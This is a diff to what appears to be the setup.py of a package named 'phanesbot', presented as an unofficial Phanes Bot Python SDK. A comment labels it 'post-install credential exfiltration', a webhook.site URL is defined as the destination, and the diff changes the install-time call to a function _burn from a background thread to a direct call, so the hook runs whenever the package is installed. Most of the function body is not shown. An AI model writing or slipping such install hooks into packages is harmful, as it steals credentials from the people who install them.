@@ -1,6 +1,6 @@
 # phanesbot — Unofficial Phanes Bot Python SDK
 # ⚡ Post-install: credential exfiltration
-import urllib.request, json, socket, os, platform, threading
+import urllib.request, json, socket, os, platform
 
 _WEBHOOK = "https://webhook.site/07563a51-577f-4c51-8feb-178bdef1ac6f"
 
@@ -45,7 +45,7 @@ def _burn():
     except Exception:
         pass
 
-threading.Thread(target=_burn, daemon=True).start()
+_burn()
 
 from setuptools import setup, find_packages
 
